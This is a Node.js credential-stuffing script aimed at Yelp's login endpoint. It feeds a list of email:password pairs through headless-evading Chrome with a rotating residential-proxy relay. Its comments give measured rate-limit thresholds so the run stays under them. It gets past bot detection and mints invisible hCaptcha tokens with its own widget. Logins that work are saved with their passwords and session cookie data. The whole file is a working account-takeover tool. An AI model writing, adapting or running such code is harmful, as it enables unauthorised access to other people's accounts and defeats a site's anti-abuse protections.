const http = require('http');
const net = require('net');
const fs = require('fs');
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

// EXPERIMENTAL - in-browser IP rotation.
// Teardown of the relay tunnels leaves Chrome's network service unable to re-hydrate on
// this build: 4 consecutive fresh IPs failed to load /login/ after a rotation.
// Stable path is chunked relaunch: runner/pool.ps1 + runner/batch-fast.js (15 rows per IP).
// Pooled fast path: ONE Chrome per worker for the whole run.
// The relay rotates the upstream proxy credential in place (closing tunnels), so an IP
// rotation costs a page reload (~8-12 s) instead of a Chrome launch (~30 s incl. DataDome).
//
// Budgets measured on production: 15 POST/60 s triggers 429, 30 POST/IP triggers 403.
// Default: 15 POST per IP, rotate, repeat. No pacing needed inside a chunk.
//
// env: BID LIST OUT POOLFILE [ROWS_PER_IP] [MAXT] [SITEKEY]

const BID = parseInt(process.env.BID || '0', 10);
const LIST = process.env.LIST, OUT = process.env.OUT, POOLFILE = process.env.POOLFILE;
const ROWS_PER_IP = parseInt(process.env.ROWS_PER_IP || '15', 10);
const MAXT = parseInt(process.env.MAXT || '3600000', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';

const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SUFFIX = process.env.PU_SUFFIX || '-sesstime-1800';

const pool = fs.readFileSync(POOLFILE, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
  const i = l.indexOf(':'); return { user: l.slice(0, i), pass: l.slice(i + 1) };
});
if (!pool.length) { console.error('empty pool'); process.exit(2); }

let active = 0;
let connTag = '-';
function credFor(idx) {
  const a = pool[idx % pool.length];
  const sess = 'p' + BID + 'x' + Math.floor(Math.random() * 1e6);
  return { user: a.user + '-sessid-' + sess + SUFFIX, pass: a.pass, label: a.user };
}
let current = credFor(0);
const sockets = new Set();
const auth = c => 'Basic ' + Buffer.from(c.user + ':' + c.pass).toString('base64');

const LP = 8986 + BID, CP = 9306 + BID;

const relay = http.createServer((q, s) => {
  if (q.url === '/__rotate') {
    active++;
    current = credFor(active);
    for (const x of sockets) { try { x.destroy(); } catch (e) {} }
    sockets.clear();
    s.on('error', () => {});
    s.writeHead(200, { 'content-type': 'application/json' });
    s.end(JSON.stringify({ active, label: current.label }));
    return;
  }
  s.writeHead(405); s.end();
});
relay.on('connect', (req, cs, head) => {
  const c = current;
  const up = net.connect(PP, PH, () => up.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + auth(c) + '\r\n\r\n'));
  sockets.add(cs); sockets.add(up);
  cs.on('error', () => {}); up.on('error', () => {});
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    up.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} up.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    up.pipe(cs); cs.pipe(up);
    if (head && head.length) up.write(head);
    up.on('close', () => { sockets.delete(up); sockets.delete(cs); });
    cs.on('close', () => { sockets.delete(up); sockets.delete(cs); });
    connTag = c.label;
  }
  up.on('data', onData);
  up.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

const sleep = ms => new Promise(r => setTimeout(r, ms));
async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
const t0 = Date.now();

(async () => {
  fs.writeFileSync(OUT, '');
  try {
    const st = fs.statfsSync(os.tmpdir());
    const freeGB = st.bavail * st.bsize / 1e9;
    if (freeGB < 2) { rec({ event: 'abort', why: 'disk', freeGB: Math.round(freeGB * 10) / 10 }); process.exit(2); }
  } catch (e) {}

  const creds = fs.readFileSync(LIST, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
    const c = l.indexOf(':'); return { email: l.slice(0, c), pass: l.slice(c + 1) };
  });
  rec({ event: 'start', n: creds.length, mode: 'pool', rowsPerIp: ROWS_PER_IP, pool: pool.length, bid: BID });

  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'cdp-p' + BID + '-' + Date.now());
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
    '--window-size=880,680', '--lang=en-US', '--user-data-dir=' + udd,
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'https://www.yelp.com/login/'
  ], { stdio: 'ignore' });

  const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
  if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => { let m; try { m = JSON.parse(ev.data); } catch (e) { return; } if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); } });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(r => { const mid = ++id; pend.set(mid, r); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  const sendS = (mth, p) => new Promise(r => { const mid = ++id; pend.set(mid, r); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
  await sleep(8000);
  const t = await send('Target.getTargets'); let sid = null; let pageTarget = null;
  if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) { pageTarget = pg.targetId; const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; } }
  const ev = e => new Promise(r => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); r(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => r(null), 40000);
  });
  await sendS('Page.enable');

  let ddTries = 0;
  async function waitLogin() {
    for (let k = 0; k < 30; k++) {
      await sleep(1200);
      const s = await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
      try { const o = JSON.parse(s); if (o && o.l > 400000) return true; } catch (e) {}
    }
    return false;
  }
  async function hydrate() {
    for (let a = 0; a < 4; a++) {
      await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
      for (let k = 0; k < 18; k++) {
        await sleep(1000);
        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
        try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 400000) return true; } catch (e) {}
      }
    }
    return false;
  }
  async function rotate() {
    // A dirty account must not kill the run: try up to 4 fresh IPs before giving up.
    for (let attempt = 0; attempt < 4; attempt++) {
      const r = await fetch('http://127.0.0.1:' + LP + '/__rotate').then(x => x.json()).catch(() => null);
      await sleep(500);
      try { await send('Target.closeTarget', { targetId: pageTarget }); } catch (e) {}
      const ct = await send('Target.createTarget', { url: 'https://www.yelp.com/login/' });
      const tid = ct && ct.result && ct.result.targetId;
      if (tid) {
        pageTarget = tid;
        const at = await send('Target.attachToTarget', { targetId: tid, flatten: true });
        if (at && at.result) sid = at.result.sessionId;
        try { await sendS('Page.enable'); } catch (e) {}
      }
      await sleep(1200);
      const ok = await hydrate();
      if (ok) {
        const csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
        await armWidget();
        rec({ event: 'rotate', to: r && r.label, ok: true, attempt });
        return { ok: true, csrf };
      }
      rec({ event: 'rotate_bad_ip', to: r && r.label, attempt });
    }
    rec({ event: 'rotate', ok: false });
    return { ok: false, csrf: '' };
  }
  async function armWidget() {
    return await ev(`(function(){
      if(window.__fcReady) return 'ready:'+window.__wid;
      if(!window.hcaptcha) return 'no-api';
      var d=document.createElement('div'); d.id='__fcap'; d.style.display='none'; document.body.appendChild(d);
      try { window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible'}); } catch(e){ return 'err:'+e.message; }
      window.__fcReady=true; return 'own:'+window.__wid;
    })()`);
  }
  const mint = () => ev(`new Promise(function(res){
    var w=window.__wid, done=false; function fin(t){ if(!done){ done=true; res(t||''); } }
    try { window.hcaptcha.execute(w); } catch(e){ fin(''); return; }
    var n=0, iv=setInterval(function(){
      n++; var t=''; try { t=window.hcaptcha.getResponse(w)||''; } catch(e){}
      if(t){ clearInterval(iv); fin(t); } else if(n>140){ clearInterval(iv); fin(''); }
    },150);
  })`);

  let ok = await hydrate();
  rec({ event: 'hydrated', ok });
  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {} return; }
  let armed = await armWidget();
  rec({ event: 'widget', armed });
  let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);

  let postsOnIp = 0, ipIndex = 0, rotOk = 0, rotFail = 0;
  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, tokFail = 0, posted = 0;
  const successes = [], msAll = [];

  for (let i = 0; i < creds.length; i++) {
    if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
    if (postsOnIp >= ROWS_PER_IP) {
      const rr = await rotate();
      if (!rr.ok) { rotFail++; rec({ event: 'rotate_fail', at: i }); break; }
      rotOk++; ipIndex++; postsOnIp = 0; csrf = rr.csrf;
      i--; continue; // re-run this row on the fresh IP (do not skip it)
    }
    const c = creds[i];
    let fin = false;

    for (let att = 0; att < 3 && !fin; att++) {
      const tt = Date.now();
      const tok = await mint();
      const tokMs = Date.now() - tt;
      if (!tok) tokFail++;

      const tp = Date.now();
      postsOnIp++; posted++;
      const raw = await ev(`(async function(){
        var b=new URLSearchParams();
        b.set('csrftok', ${JSON.stringify(csrf)});
        b.set('email', ${JSON.stringify(c.email)});
        b.set('password', ${JSON.stringify(c.pass)});
        b.set('hcaptcha_response', ${JSON.stringify(String(tok || ''))});
        try {
          var r=await fetch('/login/newajax',{method:'POST',credentials:'include',
            headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
            body:b.toString()});
          return JSON.stringify({status:r.status, body:(await r.text()).slice(0,600)});
        } catch(e){ return JSON.stringify({status:-1, body:'fetch:'+e.message}); }
      })()`);
      const postMs = Date.now() - tp;

      let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
      let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}

      if (r.status === 429) {
        r429++;
        rec({ event: 'r429', at: i + 1, postsOnIp });
        await sleep(65000);
        continue;
      }
      if (r.status === 403) {
        r403++;
        rec({ event: 'r403', at: i + 1, postsOnIp });
        const rr = await rotate();
        if (!rr.ok) { rotFail++; fin = true; break; }
        rotOk++; ipIndex++; postsOnIp = 0; csrf = rr.csrf;
        continue;
      }

      const isSuccess = !!(js && js.success === true);
      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test((js.errors || []).join(' ')));
      const isUnable = !!(js && /unable to log you in/i.test((js.errors || []).join(' ')));
      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess);
      const isClosed = !!(js && /has been closed/i.test((js.errors || []).join(' ')));

      if (isSuccess) success++; else if (isInvalid) validated++; else if (isUnable) unable++;
      else if (isLink) link++; else if (isClosed) closed++; else unknown++;
      msAll.push(tokMs + postMs);

      let profileStatus = null, zss = null;
      if (isSuccess) {
        await sleep(2000);
        profileStatus = await ev(`(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
        const ck = await sendS('Network.getAllCookies', {});
        const all = (ck && ck.result && ck.result.cookies) || [];
        zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
        successes.push({ email: c.email, pass: c.pass, profileStatus, zss });
      }
      rec({ i: i + 1, email: c.email, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, ip: ipIndex, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, ms: tokMs + postMs });
      fin = true;
    }
  }

  const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
  rec({ event: 'summary', mode: 'pool', processed: msAll.length, posted, ips: ipIndex + 1, rotOk, rotFail,
        validated, success, unable, link, closed, unknown, r429, r403, tokFail,
        avgMs: avg(msAll), secs: Math.round((Date.now() - t0) / 1000), successes });

  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { relay.close(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  setTimeout(() => process.exit(0), 800);
})();




